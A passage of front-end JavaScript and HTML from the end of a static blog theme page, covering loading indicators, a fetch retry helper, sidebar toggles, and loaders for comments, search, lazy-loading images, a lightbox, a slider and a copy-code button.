        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
